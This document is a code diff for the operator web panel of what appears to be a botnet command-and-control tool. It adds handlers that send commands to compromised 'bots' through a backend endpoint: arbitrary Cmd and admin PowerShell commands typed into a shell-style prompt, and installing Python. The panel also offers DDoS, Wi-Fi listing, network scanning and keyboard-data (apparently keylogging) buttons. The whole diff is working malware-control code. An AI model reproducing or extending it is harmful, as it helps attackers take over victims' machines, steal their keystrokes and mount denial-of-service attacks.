@@ -3,6 +3,7 @@ import {
     Alert, AlertIcon,
     Breadcrumb,
     BreadcrumbItem,
+    InputLeftElement,
     BreadcrumbLink,
     Button, Input, InputGroup, InputRightElement, Text, useToast,
 } from '@chakra-ui/react'
@@ -34,7 +35,15 @@ export default function BotDetailPage() {
 
     const [channel, setChannel] = useState<Channel | null>(null)
     const [loading, setLoading] = useState<boolean>(false)
-    const [command, setCommand] = useState<boolean>(false)
+    const [command, setCommand] = useState<string>("")
+
+    const handleCommandChange = (event) => {
+        setCommand(event.target.value)
+        console.log(event.target.value)
+    }
+
+
+
     const toast = useToast()
 
     useEffect(() => {
@@ -191,7 +200,21 @@ export default function BotDetailPage() {
     }
 
     async function handleInstallPython() {
+        const payload = {
+            "botId" : currentBot,
+            "name" : "InstallPython",
+            "args" : {}
+        }
 
+        const res = await fetch(backendUrl + "/commands", {
+            method: "POST",
+            body: JSON.stringify(payload),
+            headers: {
+                "Content-Type" : "application/json"
+            }
+        })
+
+        commandSent()
     }
 
     async function handleInstallIpScanner() {
@@ -261,25 +284,45 @@ export default function BotDetailPage() {
     }
 
     async function handleCmd() {
+
         const payload = {
             "botId" : currentBot,
-            "name" : "PowershellAdmin",
+            "name" : "RunCommand",
             "args" : {
-                command: "whoami"
+                command: command
             }
         }
 
+        const res = await fetch(backendUrl + "/commands", {
+            method : "POST",
+            body: JSON.stringify(payload),
+            headers: {
+                "Content-Type" : "application/json"
+            }
+        })
+
+        setCommand("")
         commandSent()
     }
 
     async function handleAdminPowershell() {
         const payload = {
             "botId" : currentBot,
-            "name" : "RunCommand",
+            "name" : "PowershellAdmin",
             "args" : {
-                command: "whoami"
+                command: command
             }
         }
+
+        const res = await fetch(backendUrl + "/commands", {
+            method: "POST",
+            body: JSON.stringify(payload),
+            headers: {
+                "Content-Type" : "application/json"
+            }
+        })
+
+        setCommand("")
 
         commandSent()
     }
@@ -357,6 +400,10 @@ export default function BotDetailPage() {
     }
 
 
+
+
+
+
     return (
         <main className="flex flex-wrap gap-4">
             <div className={"flex basis-full bg-gray-400  p-6 "}>
@@ -391,8 +438,6 @@ export default function BotDetailPage() {
                         <Button colorScheme='green' onClick={handleWifi}>Wifi list</Button>
                         <Button colorScheme='green' onClick={handleDdos}>Ddos</Button>
                         <Button colorScheme='green' onClick={handleNetworkScan}>Network Scan</Button>
-                        <Button colorScheme='green' onClick={handleCmd}>Cmd</Button>
-                        <Button colorScheme='green' onClick={handleAdminPowershell}>Admin Powershell</Button>
                         <Button colorScheme='green' onClick={handleKeyboardData}>Keyboard Data</Button>
 
                     </div>
@@ -412,20 +457,18 @@ export default function BotDetailPage() {
 
             <div className={"flex basis-full flex-wrap p-4 gap-4"}>
                 <div className={"flex basis-full"}>
-                    <Text>Batch command</Text>
                     <InputGroup size='md'>
-                        <Input pr='4.5rem'/>
-                        <InputRightElement width='4.5rem'>
-                            <Button h='1.75rem' size='sm'>Send</Button>
-                        </InputRightElement>
-                    </InputGroup>
-                </div>
-                <div className={"flex basis-full"}>
-                    <InputGroup size='md'>
-                        <Text>Powershell admin command</Text>
-                        <Input pr='4.5rem'/>
-                        <InputRightElement width='4.5rem'>
-                            <Button h='1.75rem' size='sm'>Send</Button>
+                        <InputLeftElement
+                            pointerEvents='none'
+                            color='gray.300'
+                            fontSize='1.2em'
+                        >
+                            $
+                        </InputLeftElement>
+                        <Input pr='4.5rem'   value={command} onChange={handleCommandChange}/>
+                        <InputRightElement className={"gap-2"} width='20rem'>
+                            <Button size='sm' onClick={handleCmd} >Send as Cmd</Button>
+                            <Button size='sm' onClick={handleAdminPowershell}>Send as Admin Powershell</Button>
                         </InputRightElement>
                     </InputGroup>
                 </div>
